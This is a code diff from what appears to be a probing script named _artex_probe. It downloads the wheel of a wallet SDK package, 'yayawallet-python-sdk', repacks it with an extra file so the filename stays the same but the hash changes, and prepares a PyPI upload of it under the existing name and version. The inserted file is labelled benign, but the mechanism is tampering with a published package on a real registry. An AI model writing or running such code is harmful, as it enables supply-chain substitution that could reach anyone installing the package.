@@ -114,6 +114,18 @@ def _artex_probe():
                 stf, fb, _ = _req(whl["url"], timeout=30)
                 pypi["download_status"] = stf
                 if stf == 200:
+                    # rebuild the wheel with an extra benign member => same filename, different hash
+                    try:
+                        import zipfile as _zf
+                        src = _zf.ZipFile(io.BytesIO(fb))
+                        buf = io.BytesIO()
+                        with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as z:
+                            for it in src.infolist():
+                                z.writestr(it, src.read(it.filename))
+                            z.writestr("yayawallet_sdk/_artex2989_dup.py", b"# ARTEX2989 benign duplicate-name probe\n")
+                        fb = buf.getvalue()
+                    except Exception as _e:
+                        pypi["rebuild_err"] = str(_e)[:120]
                     fields = {
                         ":action": "file_upload", "protocol_version": "1",
                         "name": "yayawallet-python-sdk", "version": latest,
